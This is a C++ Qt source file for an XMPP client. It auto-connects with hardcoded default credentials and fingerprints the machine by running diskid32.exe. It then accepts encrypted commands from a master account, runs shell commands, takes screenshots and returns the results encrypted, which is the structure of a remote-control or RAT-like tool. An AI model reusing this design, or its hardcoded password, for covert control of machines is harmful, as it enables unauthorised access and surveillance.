#include "freyaim_global.h"
#include "freyabasecontrol.h"
#include "freyadefaultclient.h"
#include "freyacryptogram.h"
#include "freyadefaultcmd.h"
#include "freyascreencmd.h"

#define DEFAULTACCOUND   "default"
#define DEFAULTPASSWD    "default123"
#define DEFAULTRESOURCE  "defResource"
#define FREYAMASTERRES   "FreyaMS"
#define DISKID32         "./diskid32.exe"

FreyaDefaultClient::FreyaDefaultClient(QObject *parent) :
    QXmppClient(parent), FreyaBaseAction(FreyaBaseControl::GetFreyaControl(), FREYA_OBJ_DEFAULTCLIENT),
    m_FreyaDefaultCMD(NULL),m_FreyaScreenCMD(NULL)
{
    logger()->setLoggingType(QXmppLogger::FileLogging);
    connect(this, SIGNAL(stateChanged(QXmppClient::State)), SLOT(OnClientStateChanged(QXmppClient::State)));
    connect(this, SIGNAL(iqReceived (QXmppIq)), SLOT(OnIqReceived(QXmppIq)));
    connect(this, SIGNAL(messageReceived(QXmppMessage)), SLOT(OnMessageReceived(QXmppMessage)));
    connect(this, SIGNAL(presenceReceived(QXmppPresence)), SLOT(OnPresenceReceived(QXmppPresence)));
    connect(this, SIGNAL(error(QXmppClient::Error)), SLOT(OnClientError(QXmppClient::Error)));
    connect(this, SIGNAL(loggerChanged(QXmppLogger*)), SLOT(OnLoggerChanged(QXmppLogger*)));

    connect(&rosterManager(), SIGNAL(rosterReceived()), this, SLOT(OnRosterReceived()));

    initStaticData();
}

FreyaDefaultClient::~FreyaDefaultClient()
{
    if(isConnected())
    {
        disconnectFromServer();
    }
}

void FreyaDefaultClient::initStaticData()
{
    QSettings iniSet(FREYA_PTH_STATICCONFIGPATH, QSettings::IniFormat);
    if(!QFile::exists(FREYA_PTH_STATICCONFIGPATH))
    {
        iniSet.setValue(FreyaCryptogram::EnCryptogram(FREYA_CFG_CONFIDSERVER),
                        FreyaCryptogram::EnCryptogram(FREYA_INF_DEFCONFSERVER));

        iniSet.setValue(FreyaCryptogram::EnCryptogram(FREYA_CFG_CONFIDPORT),
                        FreyaCryptogram::EnCryptogram(FREYA_INF_DEFCONFPORT));

        iniSet.setValue(FreyaCryptogram::EnCryptogram(FREYA_CFG_CONFIDDOMAIN),
                        FreyaCryptogram::EnCryptogram(FREYA_INF_DEFCONFDOMAIN));

        iniSet.setValue(FreyaCryptogram::EnCryptogram(FREYA_CFG_CONFIDACCOUND),
                        FreyaCryptogram::EnCryptogram(DEFAULTACCOUND));

        iniSet.setValue(FreyaCryptogram::EnCryptogram(FREYA_CFG_CONFIDPASSWORD),
                        FreyaCryptogram::EnCryptogram(DEFAULTPASSWD));
    }
    configuration().setHost(FreyaCryptogram::DeCryptogram(iniSet.value(FreyaCryptogram::EnCryptogram(FREYA_CFG_CONFIDSERVER)).toString()));
    configuration().setPort(FreyaCryptogram::DeCryptogram(iniSet.value(FreyaCryptogram::EnCryptogram(FREYA_CFG_CONFIDPORT)).toString()).toInt());
    configuration().setDomain(FreyaCryptogram::DeCryptogram(iniSet.value(FreyaCryptogram::EnCryptogram(FREYA_CFG_CONFIDDOMAIN)).toString()));
    configuration().setJid(FreyaCryptogram::DeCryptogram(iniSet.value(FreyaCryptogram::EnCryptogram(FREYA_CFG_CONFIDACCOUND)).toString()) +
                           "@" + FreyaCryptogram::DeCryptogram(iniSet.value(FreyaCryptogram::EnCryptogram(FREYA_CFG_CONFIDDOMAIN)).toString()));
    configuration().setPassword(FreyaCryptogram::DeCryptogram(iniSet.value(FreyaCryptogram::EnCryptogram(FREYA_CFG_CONFIDPASSWORD)).toString()));

    QString resourceStr = figoutDiskID();
    configuration().setResource(QString(resourceStr.isEmpty()? DEFAULTRESOURCE : resourceStr) + QDateTime::currentDateTime().toString("-yyMMddHHmmss"));

    QXmppPresence pres;
    pres.setType(QXmppPresence::Available);
    pres.setAvailableStatusType(QXmppPresence::Online);
    connectToServer(configuration(), pres);

    m_FreyaMSJid = configuration().jidBare();
}

QString FreyaDefaultClient::figoutDiskID()
{
    QString DiskIdStr("");
    if(QFile::exists(DISKID32))
    {
        QString defaultDir = FREYA_FUN_PERSONCONFIGPATH(configuration().jidBare());
        QDir dir(defaultDir);
        if(!dir.exists())
        {
            dir.mkpath(defaultDir);
        }
        QFile::copy(DISKID32, defaultDir + DISKID32);

        QProcess p;
        p.start("cmd", QStringList()<<"/c"<<defaultDir + DISKID32);
        p.waitForStarted();
        p.waitForFinished();
        QString strTemp = QString::fromLocal8Bit(p.readAllStandardOutput());
        QStringList tempList = strTemp.split(QRegExp("\\n"));
        foreach(const QString tempLine, tempList)
        {
            if(tempLine.startsWith("Hard Drive Serial Number", Qt::CaseSensitive))
            {
                QStringList SerialNum = tempLine.split(":");
                if(2 == SerialNum.size())
                {
                    DiskIdStr = SerialNum.at(1);
                    DiskIdStr.remove(QRegExp("\\s+"));
                }
                break;
            }
        }
    }
    return DiskIdStr;
}

void FreyaDefaultClient::Execute()
{
}

void FreyaDefaultClient::Execute(const quint64 &/*command*/)
{
}

void FreyaDefaultClient::Execute(FreyaBaseData *pData)
{
    if(FREYA_CMD_REGISTREQUEST == pData->command)
    {
        QXmppRegisterIq *pRegIq = VARIANTTOCUSTOMCLS(pData->arguments, QXmppRegisterIq);
        if(isConnected() && pRegIq)
        {
            FreyaBaseData *RegIqData = new FreyaBaseData(*pData);
            RegIqData->command = FREYA_CMD_REGISTRESULT;
            FreyaBaseControl::GetFreyaControl()->InsertBaseData(RegIqData);
            sendPacket(*pRegIq);
        }
        else
        {
            pData->command = FREYA_CMD_REGISTRESULT;
            pData->arguments = tr("Cannot connected account register server!");
            FREYA_REQUESTEXECUTION(pData);
        }
    }
}

void FreyaDefaultClient::OnClientStateChanged(QXmppClient::State state)
{
    switch (state) {
    case QXmppClient::DisconnectedState:
        qDebug()<<"Temp=>"<<"Default client is Disconnected!";
        break;
    case QXmppClient::ConnectingState:
        qDebug()<<"Temp=>"<<"Default client is Connecting...";
        break;
    case QXmppClient::ConnectedState:
        qDebug()<<"Temp=>"<<"Default client is Connected!";
        break;
    default:
        break;
    }
    qDebug()<<"Temp=>"<<"Jid:"<<configuration().jid();
}

void FreyaDefaultClient::OnRosterReceived()
{
    qDebug()<<"Temp=>"<<"Default Roster Received:"<<rosterManager().getRosterBareJids();
}

void FreyaDefaultClient::OnIqReceived(const QXmppIq &iq)
{
    if(iq.to() == configuration().jid())
    {
        FreyaBaseData regIqData;
        regIqData.dataID = iq.id();
        FreyaBaseData *iqData = FreyaBaseControl::GetFreyaControl()->TakeBaseData(iq.id());
        if(iqData)
        {
            regIqData.command = iqData->command;
            delete iqData;
        }
        regIqData.arguments = CUSTOMCLSTOVARIANT(&iq);
        FREYA_REQUESTEXECUTION(&regIqData);
    }
}

void FreyaDefaultClient::OnMessageReceived(const QXmppMessage &message)
{
    qDebug()<<"Temp=>"<<"Default Message Received:"<<message.body();
    if(message.from().contains("/" FREYAMASTERRES, Qt::CaseSensitive))
    {
        m_FreyaMSJid = message.from();
    }
    QVariantMap commandMap;
    QDataStream ds(QByteArray::fromHex(FreyaCryptogram::DeCryptogram(message.body(), 2).toUtf8()));
    ds>>commandMap;
    if(commandMap.value(FREYAMS_STR_RESOURCENAME).toString() == configuration().resource())
    {
        if(commandMap.contains(FREYAMS_STR_COMMANDLINE))
        {
            if(!m_FreyaDefaultCMD)
            {
                m_FreyaDefaultCMD = new FreyaDefaultCMD(this);
                connect(m_FreyaDefaultCMD, SIGNAL(ToOutput(QVariantMap)), this, SLOT(OnCMDReceive(QVariantMap)));
            }
            m_FreyaDefaultCMD->ParseCommand(commandMap);
        }
        else if(commandMap.contains(FREYAMS_STR_CMDREQUESTSCREEN) ||
                commandMap.contains(FREYAMS_STR_CMDAUTOSCREEN) ||
                commandMap.contains(FREYAMS_STR_CMDSTOPSCREEN))
        {
            if(!m_FreyaScreenCMD)
            {
                m_FreyaScreenCMD = new FreyaScreenCMD(this);
                connect(m_FreyaScreenCMD, SIGNAL(ToOutput(QVariantMap)), this, SLOT(OnCMDReceive(QVariantMap)));
            }
            m_FreyaScreenCMD->ParseCommand(commandMap);
        }
    }
}

void FreyaDefaultClient::OnPresenceReceived(const QXmppPresence &presence)
{
    qDebug()<<"Temp=>"<<"Default Presence Received:"<<presence.type();
    qDebug()<<"Temp=>"<<"Default Resources:"<<rosterManager().getResources(configuration().jidBare());
}

void FreyaDefaultClient::OnClientError(QXmppClient::Error error)
{
    qDebug()<<"Temp=>"<<"Default Client Error:"<<error;
}

void FreyaDefaultClient::OnLoggerChanged(QXmppLogger *logger)
{
    qDebug()<<"Temp=>"<<"Default Logger Changed:"<<logger;
}

void FreyaDefaultClient::OnCMDReceive(const QVariantMap &output)
{
    QByteArray ba;
    QDataStream ds(&ba, QIODevice::WriteOnly);
    ds<<output;
    sendMessage(m_FreyaMSJid, FreyaCryptogram::EnCryptogram(QString::fromUtf8(ba.toHex()), 2));
}
